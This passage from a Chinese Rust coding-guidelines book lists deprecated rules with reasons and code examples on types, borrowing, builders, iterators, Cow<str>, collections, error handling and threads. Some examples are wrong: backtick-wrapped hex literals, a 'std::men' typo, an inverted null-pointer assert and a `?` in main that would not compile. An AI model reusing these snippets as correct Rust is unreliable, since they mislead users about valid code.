<li><code>usize</code> 不会因为平台架构的切换而导致索引值被截断的问题，比如 将<code>u32</code>类型的索引 用到 16位大小的嵌入式平台就会出问题。</li>
</ol>
<h3 id="gtypunt01---当函数不关心返回值但要处理错误时应使用单元类型"><a class="header" href="#gtypunt01---当函数不关心返回值但要处理错误时应使用单元类型">G.TYP.UNT.01   当函数不关心返回值但要处理错误时应使用单元类型</a></h3>
<p><strong>淘汰原因</strong></p>
<p>这属于 Rust 开发者必备基本认知，有点偏教程向，故淘汰。</p>
<p><strong>【级别】</strong> 建议</p>
<p>【定制化参考】</p>
<p>可以检测使用 <code>Option&lt;T&gt;</code> 包含 <code>Error</code> 类型的情况，发出警告。</p>
<p><strong>【描述】</strong></p>
<p>单元类型代表 <code>无返回值</code>。当返回类型无返回值但要处理错误时，应使用Result&lt;(), Error&gt;类型，</p>
<p>而非Option类型。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn f() -&gt; Option&lt;Error&gt; {
    
    // ...
    
    None
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 表示该函数要么成功，要么返回各自错误
fn f() -&gt; Result&lt;(), Error&gt; {
    
    // ...
    
    // Error handle
    Ok(())
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>是否可定制</th></tr></thead><tbody>
<tr><td>_</td><td>no</td><td>no</td><td>_</td><td>yes</td></tr>
</tbody></table>
<h3 id="gtypint02-对于大整数字面量宜使用十六进制表示"><a class="header" href="#gtypint02-对于大整数字面量宜使用十六进制表示">G.TYP.INT.02 对于大整数字面量宜使用十六进制表示</a></h3>
<p><strong>淘汰原因</strong></p>
<p>这个不做限制了，因人而异。</p>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>略</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let a = `255` 
let b = `65_535`
let c =`4_042_322_160` 
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let a = `0xFF`
let b = `0xFFFF`
let c = `0xF0F0_F0F0
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#decimal_literal_representation">decimal_literal_representation</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<h3 id="ptypref01--使用引用的时候要注意其生命周期不要重合"><a class="header" href="#ptypref01--使用引用的时候要注意其生命周期不要重合">P.TYP.REF.01  使用引用的时候要注意其生命周期不要重合</a></h3>
<p><strong>淘汰原因</strong></p>
<p>偏教程向，这应该是 Rust 开发者基本认知，而且编译器会报错。</p>
<p><strong>【描述】</strong></p>
<p>在使用 引用的时候，要注意分析其生命周期，不可变借用和可变借用之间，以及可变借用之间不要有重叠。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main(){
    let mut s = String::from(&quot;hello&quot;);
    // r1 是不可变借用，其生命周期和 可变借用 r3 重叠，所以会出问题
    let r1 = &amp;s; // no problem    ---------------- lifetime r1 start
    let r2 = &amp;mut s; // no problem
    let r3 = &amp;mut s; // BIG PROBLEM -------------- lifetime r3 start 

    println!(&quot;{}, {}, and {}&quot;, r1, r2, r3);  //  lifetime r1, r2, r3  end; 
    
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main(){
    let mut s = String::from(&quot;hello&quot;);

    let r1 = &amp;s; // no problem
    let r2 = &amp;mut s; // no problem
    let r3 = &amp;mut s; // no PROBLEM

    // println!(&quot;{}, {}, and {}&quot;, r1, r2, r3);
    
}
</code></pre></pre>
<h3 id="ptyptup01--宜使用元组解构来同时定义多个变量"><a class="header" href="#ptyptup01--宜使用元组解构来同时定义多个变量">P.TYP.TUP.01  宜使用元组解构来同时定义多个变量</a></h3>
<p><strong>淘汰原因</strong></p>
<p>偏教程向，这应该是 Rust 开发者基本认知。</p>
<p><strong>【描述】</strong></p>
<p>可以利用元组解构的特性，来更好地精简代码。</p>
<p><strong>【示例】</strong></p>
<pre><pre class="playground"><code class="language-rust">struct A(i32, i32);

fn hello( A(a, b): A){
    println!(&quot;{}, {}&quot;, a, b);
}

fn main(){
    let a = A(1, 2) ;
    hello(a);
}
</code></pre></pre>
<h3 id="ptyparr01-当数组长度在编译期就已经确定应优先使用固定长度数组而非动态数组-vect"><a class="header" href="#ptyparr01-当数组长度在编译期就已经确定应优先使用固定长度数组而非动态数组-vect">P.TYP.ARR.01 当数组长度在编译期就已经确定，应优先使用固定长度数组，而非动态数组（ <code>Vec&lt;T&gt;</code>）</a></h3>
<p><strong>淘汰原因</strong></p>
<p>偏教程向，这应该是 Rust 开发者基本认知。</p>
<p><strong>【描述】</strong></p>
<p>固定长度数组会根据元素类型，优先选择存储在栈上，可以优化内存分配。当然，过大的数组可以酌情考虑放到堆内存，这个依据具体场景来决定。</p>
<p>当编译期长度可以确定，但长度并不是唯一确定的，那么可以考虑使用常量泛型。注意：常量泛型特性从 Rust 1.51版稳定。</p>
<p><strong>【示例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct Grid {
    array: [u32; 5],
    width: usize,
    height: usize,
}
<span class="boring">}
</span></code></pre></pre>
<p>常量泛型：</p>
<pre><pre class="playground"><code class="language-rust">pub struct Grid&lt;T, const W: usize, const H: usize&gt;
where
{
    array: [[T; W]; H],
}

impl&lt;T, const W: usize, const H: usize&gt; Default for Grid&lt;T, W, H&gt;
where
    T: Default + Copy,
{
    fn default() -&gt; Self {
        Self {
            array: [[T::default(); W ]; H],
        }
    }
}

const WIDTH: usize = 300;
const HEIGHT: usize = 200;

fn main(){
    let _g = Grid::&lt;usize, 3, 4&gt;::default();  
    let _h = Grid::&lt;usize, WIDTH, HEIGHT&gt;::default();
}
</code></pre></pre>
<p>注意，常量泛型目前还有一些特性并未完善，比如下面示例中的 <code>#![feature(generic_const_exprs)]</code> 特性，需要在 Nightly Rust 下使用。</p>
<pre><pre class="playground"><code class="language-rust">#![feature(generic_const_exprs)]
pub struct Grid&lt;T, const W: usize, const H: usize&gt;
where
    [(); W * H]: Sized,
{
    array: [T; W * H],
}

impl&lt;T, const W: usize, const H: usize&gt; Default for Grid&lt;T, W, H&gt;
where
    [(); W * H]: Sized,
    T: Default + Copy,
{
    fn default() -&gt; Self {
        Self {
            array: [T::default(); W * H],
        }
    }
}

const WIDTH: usize = 300;
const HEIGHT: usize = 200;

fn main(){
    let _g = Grid::&lt;usize, 3, 4&gt;::default();  
    let _h = Grid::&lt;usize, WIDTH, HEIGHT&gt;::default();
}

</code></pre></pre>
<h3 id="ptypsct02--当需要很多构造函数或构造含有很多可选配置项时宜使用构建者模式"><a class="header" href="#ptypsct02--当需要很多构造函数或构造含有很多可选配置项时宜使用构建者模式">P.TYP.SCT.02  当需要很多构造函数，或构造含有很多可选配置项时，宜使用构建者模式</a></h3>
<p><strong>淘汰原因</strong></p>
<p>这条属于编程最佳实践，放到规范中有点臃肿，独立到最佳实践中。</p>
<p><strong>【描述】</strong></p>
<p>Rust 中没有默认的构造函数，都是自定义构造函数。</p>
<p>如果需要多个构造函数，或者构造时需要很多可选配置的复杂场景，那么构建者模式是适合你的选择。</p>
<p><strong>【示例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[derive(Debug, PartialEq)]
pub struct Foo {
    // Lots of complicated fields.
    bar: String,
}

impl Foo {
    // This method will help users to discover the builder
    pub fn builder() -&gt; FooBuilder {
        FooBuilder::default()
    }
}

#[derive(Default)]
pub struct FooBuilder {
    // Probably lots of optional fields.
    bar: String,
}

impl FooBuilder {
    pub fn new(/* ... */) -&gt; FooBuilder {
        // Set the minimally required fields of Foo.
        FooBuilder {
            bar: String::from(&quot;X&quot;),
        }
    }

    pub fn name(mut self, bar: String) -&gt; FooBuilder {
        // Set the name on the builder itself, and return the builder by value.
        self.bar = bar;
        self
    }

    // If we can get away with not consuming the Builder here, that is an
    // advantage. It means we can use the FooBuilder as a template for constructing
    // many Foos.
    pub fn build(self) -&gt; Foo {
        // Create a Foo from the FooBuilder, applying all settings in FooBuilder
        // to Foo.
        Foo { bar: self.bar }
    }
}

#[test]
fn builder_test() {
    let foo = Foo {
        bar: String::from(&quot;Y&quot;),
    };
    let foo_from_builder: Foo = FooBuilder::new().name(String::from(&quot;Y&quot;)).build();
    assert_eq!(foo, foo_from_builder);
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="ptypenm01-需要取出-enum-值的时候宜使用-stdmemtakeswapreplace"><a class="header" href="#ptypenm01-需要取出-enum-值的时候宜使用-stdmemtakeswapreplace">P.TYP.ENM.01 需要取出 Enum 值的时候宜使用 <code>std::mem::take/swap/replace</code></a></h3>
<p><strong>淘汰原因</strong></p>
<p>偏教程向。</p>
<p><strong>【描述】</strong></p>
<p>需要取出 Enum 中值的时候，可能会遇到所有权的限制，此时可以使用 <code>std::men::take</code> 获取当前的值，而将默认值替换原值，这样可以避免所有权的限制。</p>
<p>但是 <code>std::men::take</code> 只适合实现 <code>Default</code> 的类型，这样就有默认实现可以替换了。</p>
<p>如果没有实现 <code>Default</code> 的类型，可以使用 <code>std::men::swap</code> 或 <code>std::mem::replace</code> 用给定的值来替换原值。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::mem;

enum MultiVariateEnum {
    A { name: String },
    B { name: String },
    C,
    D
}

fn swizzle(e: &amp;mut MultiVariateEnum) {
    use MultiVariateEnum::*;
    *e = match e {
        // Ownership rules do not allow taking `name` by value, but we cannot
        // take the value out of a mutable reference, unless we replace it:
        A { name } =&gt; B { name: mem::take(name) },
        B { name } =&gt; A { name: mem::take(name) },
        C =&gt; D,
        D =&gt; C
    }
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="表达式"><a class="header" href="#表达式">表达式</a></h2>
<h3 id="gexp04--不应使用无效表达式语句"><a class="header" href="#gexp04--不应使用无效表达式语句">G.EXP.04  不应使用无效表达式语句</a></h3>
<p><strong>淘汰原因</strong></p>
<p>属于代码逻辑问题，不应放到规范中。这类问题交给 Clippy 这类工具即可。</p>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>无效的表达式语句，虽然会执行，但实际并没有起到什么效果。</p>
<p>也有例外情况存在。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>a+1;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let a = 41;
let a = a+1;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>像在下面代码中，为了确保常量函数 <code>new</code> 可以在输入参数超出 MAX 限制的情况下 panic，使用了一个数组的技巧：<code> [&quot;tag number out of range&quot;][(byte &gt; Self::MAX) as usize];</code> 。因为目前 在常量上下文中还无法直接使用 <code>panic!</code>，等 <code>const_panic</code> 功能稳定就可以了。</p>
<p>如果不加 <code>#[allow(clippy::no_effect)]</code> ，Clippy 会有警告。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From: https://docs.rs/crate/der/0.4.1/source/src/tag/number.rs

#[derive(Copy, Clone, Debug, Eq, PartialEq, PartialOrd, Ord)]
pub struct TagNumber(pub(super) u8);

impl TagNumber {
    /// Maximum tag number supported (inclusive).
    pub const MAX: u8 = 30;

    /// Create a new tag number (const-friendly).
    ///
    /// Panics if the tag number is greater than [`TagNumber::MAX`]. For a fallible
    /// conversion, use [`TryFrom`] instead.
    #[allow(clippy::no_effect)]
    pub const fn new(byte: u8) -&gt; Self {
        // TODO(tarcieri): hax! use const panic when available
        [&quot;tag number out of range&quot;][(byte &gt; Self::MAX) as usize];
        Self(byte)
    }
	// ...   
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#no_effect">no_effect</a></td><td>yes</td><td>no</td><td><strong>complexity</strong></td><td>warn</td></tr>
</tbody></table>
<h2 id="控制流程"><a class="header" href="#控制流程">控制流程</a></h2>
<h3 id="gctf01-避免在流程控制分支中使用重复代码"><a class="header" href="#gctf01-避免在流程控制分支中使用重复代码">G.CTF.01 避免在流程控制分支中使用重复代码</a></h3>
<p><strong>淘汰原因</strong></p>
<p>属于代码逻辑问题，不应放到规范中。这类问题交给 Clippy 这类工具即可。</p>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>略</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let foo = if … {
    println!(&quot;Hello World&quot;);
    13
} else {
    println!(&quot;Hello World&quot;);
    42
};
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>println!(&quot;Hello World&quot;);
let foo = if … {
    13
} else {
    42
};
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#branches_sharing_code">branches_sharing_code</a></td><td>yes</td><td>no</td><td>nursery</td><td>allow</td></tr>
</tbody></table>
<h3 id="gctf02-控制流程的分支逻辑要保持精炼"><a class="header" href="#gctf02-控制流程的分支逻辑要保持精炼">G.CTF.02 控制流程的分支逻辑要保持精炼</a></h3>
<p><strong>淘汰原因</strong></p>
<p>属于代码逻辑问题，不应放到规范中。这类问题交给 Clippy 这类工具即可。</p>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>略</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>
<span class="boring">fn main() {
</span>if x {
    …
} else {     // collapsible_else_if
    if y {
        …
    }
}

if x {  // collapsible_if
    if y {
        …
    }
}

// collapsible_match
fn func(opt: Option&lt;Result&lt;u64, String&gt;&gt;) {
    let n = match opt {
        Some(n) =&gt; match n {
            Ok(n) =&gt; n,
            _ =&gt; return,
        }
        None =&gt; return,
    };
}

// double_comparisons
<span class="boring">let x = 1;
</span><span class="boring">let y = 2;
</span>if x == y || x &lt; y {}

// wildcard_in_or_patterns    
match &quot;foo&quot; {
    &quot;a&quot; =&gt; {},
    &quot;bar&quot; | _ =&gt; {},
}

<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// else if
if x {
    …
} else if y {
    …
}

// Merge multiple conditions
if x &amp;&amp; y {
    …
}

// match 
fn func(opt: Option&lt;Result&lt;u64, String&gt;&gt;) {
    let n = match opt {
        Some(Ok(n)) =&gt; n,
        _ =&gt; return,
    };
}

// comparisons
<span class="boring">let x = 1;
</span><span class="boring">let y = 2;
</span>if x &lt;= y {}

// wildcard_in_or_patterns    
match &quot;foo&quot; {
    &quot;a&quot; =&gt; {},
    _ =&gt; {},
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#collapsible_else_if">collapsible_else_if</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#collapsible_if">collapsible_if</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#collapsible_match">collapsible_match</a></td><td>yes</td><td>no</td><td>style</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#double_comparisons">double_comparisons</a></td><td>yes</td><td>no</td><td><strong>complexity</strong></td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#wildcard_in_or_patterns">wildcard_in_or_patterns</a></td><td>yes</td><td>no</td><td><strong>complexity</strong></td><td>warn</td></tr>
</tbody></table>
<h3 id="gctf06-善用标准库中提供的迭代器适配器方法来满足自己的需求"><a class="header" href="#gctf06-善用标准库中提供的迭代器适配器方法来满足自己的需求">G.CTF.06 善用标准库中提供的迭代器适配器方法来满足自己的需求</a></h3>
<p><strong>淘汰原因</strong></p>
<p>属于最佳实践编程技巧类。</p>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>Rust 标准库中提供了很多迭代器方法，要学会使用它们，选择合适的方法来满足自己的需求。</p>
<p>下面示例中，反例中的迭代器适配器方法，都可以用对应的正例中的方法代替。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// explicit_counter_loop
let v = vec![1];
fn bar(bar: usize, baz: usize) {}
let mut i = 0;
for item in &amp;v {
    bar(i, *item);
    i += 1;
}

// filter_map_identity
let iter = vec![Some(1)].into_iter();
iter.filter_map(|x| x);

// filter_next
let vec = vec![1];
vec.iter().filter(|x| **x == 0).next();

// flat_map_identity
let iter = vec![vec![0]].into_iter();
iter.flat_map(|x| x);

// flat_map_option
let nums: Vec&lt;i32&gt; = [&quot;1&quot;, &quot;2&quot;, &quot;whee!&quot;].iter().flat_map(|x| x.parse().ok()).collect();
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// explicit_counter_loop
let v = vec![1];
fn bar(bar: usize, baz: usize) {}
for (i, item) in v.iter().enumerate() { bar(i, *item); }

// filter_map_identity
let iter = vec![Some(1)].into_iter();
iter.flatten();

// filter_next
let vec = vec![1];
vec.iter().find(|x| **x == 0);

// flat_map_identity
let iter = vec![vec![0]].into_iter();
iter.flatten();

// flat_map_option
let nums: Vec&lt;i32&gt; = [&quot;1&quot;, &quot;2&quot;, &quot;whee!&quot;].iter().filter_map(|x| x.parse().ok()).collect();

<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#explicit_counter_loop">explicit_counter_loop</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#filter_map_identity">filter_map_identity</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#filter_next">filter_next</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#flat_map_identity">flat_map_identity</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#flat_map_option">flat_map_option</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<h2 id="字符串"><a class="header" href="#字符串">字符串</a></h2>
<h3 id="pstr03--可以使用cowstr来代替直接使用字符串它可以减少copy"><a class="header" href="#pstr03--可以使用cowstr来代替直接使用字符串它可以减少copy">P.STR.03  可以使用<code>Cow&lt;str&gt;</code>来代替直接使用字符串，它可以减少Copy</a></h3>
<p><strong>淘汰原因</strong></p>
<p>最佳实践编程技巧类。</p>
<p><strong>【描述】</strong></p>
<p>使用 <code>Cow&lt;str&gt;</code> 作为字符串处理函数参数和返回值，可以尽可能地减少数据Copy 和 内存分配。当字符串没有修改的时候，实际使用的是 <code>&amp;'a str</code>，只有当数据修改的时候才会使用<code>String</code>。对于读操作大于写操作的场景，使用 <code>Cow&lt;str&gt;</code> 比较合适。</p>
<p><strong>【示例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 对输入的字符串进行转义
pub fn naive&lt;'a, S: Into&lt;Cow&lt;'a, str&gt;&gt;&gt;(input: S) -&gt; Cow&lt;'a, str&gt; {
    let input = input.into();
    fn is_trouble(c: char) -&gt; bool {
        c == '&lt;' || c == '&gt;' || c == '&amp;'
    }

    if input.contains(is_trouble) {
        let mut output = String::with_capacity(input.len());
        for c in input.chars() {
            match c {
                '&lt;' =&gt; output.push_str(&quot;&amp;lt;&quot;),
                '&gt;' =&gt; output.push_str(&quot;&amp;gt;&quot;),
                '&amp;' =&gt; output.push_str(&quot;&amp;amp;&quot;),
                _ =&gt; output.push(c)
            }
        }
        // 只有在字符串修改的时候才使用 String
        Cow::Owned(output)
    } else {
        //其他情况使用 &amp;str
        input
    }
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="集合容器"><a class="header" href="#集合容器">集合容器</a></h2>
<h3 id="pclt01--根据集合各自的特点选择合适的集合类型"><a class="header" href="#pclt01--根据集合各自的特点选择合适的集合类型">P.CLT.01  根据集合各自的特点选择合适的集合类型</a></h3>
<p><strong>淘汰原因</strong></p>
<p>文档教程向，不该放到规范中。</p>
<p><strong>【描述】</strong></p>
<p>Rust 标准库内置的集合类型，在安全和性能方面还是比较靠谱的。需要仔细阅读标准库中各类集合类型的优缺点来选择合适的类型。</p>
<p><strong>下列场景考虑 <code>Vec</code></strong></p>
<ul>
<li>你想要一个可动态增长大小（堆分配）的数组</li>
<li>你想要一个栈结构</li>
<li>你想要集合元素按特定顺序排序，并且仅需要在结尾追加新元素</li>
<li>你可能只是想临时收集一些元素，并且不关心它们的实际存储</li>
</ul>
<p><strong>下列场景考虑 <code>VecDeque</code></strong></p>
<ul>
<li>你想要一个可以在头尾两端插入元素的 <code>Vec</code></li>
<li>你想要一个队列，或双端队列</li>
</ul>
<p><strong>下列场景考虑<code>LinkedList</code></strong></p>
<ul>
<li>你非常确定你真的需要一个双向链表</li>
</ul>
<p><strong>下列场景考虑 <code>Hashmap</code></strong></p>
<ul>
<li>你需要一个 KV  集合</li>
<li>你想要一个缓存</li>
</ul>
<p><strong>下列场景考虑 <code>BTreeMap</code></strong></p>
<ul>
<li>你需要一个可以排序的 <code>HashMap</code></li>
<li>你希望可以按需获取一系列元素</li>
<li>你对最小或最大的 KV 感兴趣</li>
<li>你想要寻找比某个值更大或更小的键</li>
</ul>
<p><strong>下列场景考虑使用 <code>Set</code> 系列</strong></p>
<ul>
<li>你只是需要一个 Set 集合，而不需要键值对。</li>
</ul>
<p><strong>下列场景考虑使用 <code>BinaryHeap</code></strong></p>
<ul>
<li>你想存储一堆元素，但只想在任何给定时间内处理 最大 或 最重要的元素</li>
<li>你想要一个优先队列</li>
</ul>
<h2 id="错误处理"><a class="header" href="#错误处理">错误处理</a></h2>
<h3 id="perr02--当函数的返回值或者结构体字段的值可能为空时请使用optiont"><a class="header" href="#perr02--当函数的返回值或者结构体字段的值可能为空时请使用optiont">P.ERR.02  当函数的返回值或者结构体字段的值可能为空时，请使用<code>Option&lt;T&gt;</code></a></h3>
<p><strong>淘汰原因</strong></p>
<p>教程向，不该放到规范中。</p>
<p><strong>【描述】</strong></p>
<p>在某些其他语言中，如果函数的返回值 或 结构体字段的值 可能为空时，通常会设置一个 “哨兵值（Sentinel Value）” 来应对这种问题，比如使用一个 <code>nil</code> 或 <code>-1</code> 等特殊值来判断这类情况。</p>
<p>但是，在 Rust 中不需要这样，Rust 提供了 <code>Option&lt;T&gt;</code> 类型就是专门用于应对这类情况。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">struct Config {
    must: String,
    opt: Option&lt;String&gt;,
}

// OR

fn main() {
    let sentence = &quot;The fox jumps over the dog&quot;;
    let index = sentence.find(&quot;fox&quot;);

    if let Some(fox) = index {
        let words_after_fox = &amp;sentence[fox..];
        println!(&quot;{}&quot;, words_after_fox);
    }
}
</code></pre></pre>
<h3 id="perr04---当程序中需要处理错误时应该使用-resultt-e-和--操作符"><a class="header" href="#perr04---当程序中需要处理错误时应该使用-resultt-e-和--操作符">P.ERR.04   当程序中需要处理错误时，应该使用 <code>Result&lt;T, E&gt;</code> 和 <code>?</code> 操作符</a></h3>
<p><strong>淘汰原因</strong></p>
<p>教程向，不该放到规范中。</p>
<p><strong>【描述】</strong></p>
<p>当需要处理错误时，为了保证 程序的健壮性，应该尽可能处理错误。</p>
<p><strong>【反例】</strong></p>
<p>在实现原型类项目的时候，可以“快、糙、猛”地使用 <code>expect</code>  。但是要进生产环境，需要合理地处理错误。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let res: Result&lt;usize, ()&gt; = Ok(1);
res.expect(&quot;one&quot;); // 如果有 Err， expect会 Panic ！

<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let res: Result&lt;usize, ()&gt; = Ok(1);
res?;   // Ok::&lt;(), ()&gt;(())
<span class="boring">}
</span></code></pre></pre>
<h3 id="perr06---根据应用还是库来选择不同的错误处理方式"><a class="header" href="#perr06---根据应用还是库来选择不同的错误处理方式">P.ERR.06   根据应用还是库来选择不同的错误处理方式</a></h3>
<p><strong>淘汰原因</strong></p>
<p>最佳实践向，不该放到规范中。</p>
<p><strong>【描述】</strong></p>
<p>如果编写应用，建议使用<code> Error</code> trait对象；如果编写库，则建议返回自定义错误类型，方便下游处理</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 对于应用使用 Error trait 对象更加方便
pub fn print(&amp;self, languages: &amp;Languages) -&gt; Result&lt;String, Box&lt;dyn Error&gt;&gt; {
     // do something
}

// 对于库，暴露自定义错误类型更加方便下游处理错误
#[derive(Debug)]
pub struct SendError&lt;T&gt;(pub T);

impl&lt;T&gt; fmt::Display for SendError&lt;T&gt; {
    fn fmt(&amp;self, fmt: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {
        write!(fmt, &quot;channel closed&quot;)
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="perr03---当程序中有不可恢复的错误时应该让其-panic"><a class="header" href="#perr03---当程序中有不可恢复的错误时应该让其-panic">P.ERR.03   当程序中有不可恢复的错误时，应该让其 Panic</a></h3>
<p><strong>淘汰原因</strong></p>
<p>教程向，不该放到规范中。</p>
<p><strong>【描述】</strong></p>
<p>如果遇到无法恢复的错误，则需要让程序 Panic。</p>
<p>相关 Clippy Lint： <a href="https://rust-lang.github.io/rust-clippy/master/#if_then_panic">if_then_panic</a> </p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn boot(ptr: *const usize) {
	if ptr.is_null() {
        panic!(&quot;ptr is null! boot failed!&quot;)
    }
    // or
    assert!(ptr.is_null(), &quot;ptr is null! boot failed!&quot;);
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="多线程"><a class="header" href="#多线程">多线程</a></h2>
<h3 id="pmthlok01-根据场景选择使用互斥锁还是-channel"><a class="header" href="#pmthlok01-根据场景选择使用互斥锁还是-channel">P.MTH.LOK.01 根据场景选择使用互斥锁还是 Channel</a></h3>
<p><strong>淘汰原因</strong></p>
<p>教程向，不该放到规范中。</p>
<p><strong>【描述】</strong></p>
<p>不要从哪种方式更快的角度来考虑，而应该从使用场景。性能取决于开发者如何使用它们。</p>
<p>一个简单的指南：</p>
<table><thead><tr><th><strong>Channel</strong> 适用于</th><th><strong>Mutex</strong> 适用于</th></tr></thead><tbody>
<tr><td>传递数据所有权 <br /> 分发工作单元 <br /> 传递异步结果</td><td>修改共享缓存<br /> 修改共享状态</td></tr>
</tbody></table>
<h3 id="gmthlok02-多线程环境下宜使用-arc-代替-rc"><a class="header" href="#gmthlok02-多线程环境下宜使用-arc-代替-rc">G.MTH.LOK.02 多线程环境下宜使用 <code>Arc</code> 代替 <code>Rc</code></a></h3>
<p><strong>淘汰原因</strong></p>
<p>教程向，不该放到规范中。</p>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
